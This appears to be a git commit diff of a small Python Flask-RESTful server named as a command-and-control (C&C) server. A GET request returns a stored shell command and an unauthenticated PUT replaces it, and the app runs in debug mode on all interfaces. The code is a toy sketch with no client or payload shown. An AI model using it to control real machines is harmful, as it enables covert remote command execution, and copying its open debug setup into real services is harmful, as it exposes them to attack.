0eea2cb4db4d16d30c0a01a0375a20200217dfe2
Che, Wei Lin <linton.tw@gmail.com>
2015-04-13 11:57:20 +0800

    Update C&C server using Flask-RESTful

--- command-and-control-server.py
+++ command-and-control-server.py
@@ -1,11 +1,21 @@
-from flask import Flask
+from flask import Flask, request
+from flask_restful import Resource, Api
+
 app = Flask(__name__)
+api = Api(app)
+
+cmds = {'cmd_id': "ls"}
 
 
-@app.route("/")
-def cmdandcontrol():
-    # command here
-    return "mkdir foo"
+class CmdControl(Resource):
+    def get(self):
+        return cmds['cmd_id']
 
-if __name__ == "__main__":
-    app.run(host='0.0.0.0')
+    def put(self):
+        cmds['cmd_id'] = request.data
+        return {'cmd_id': cmds['cmd_id']}
+
+api.add_resource(CmdControl, '/')
+
+if __name__ == '__main__':
+    app.run(debug=True, host='0.0.0.0')
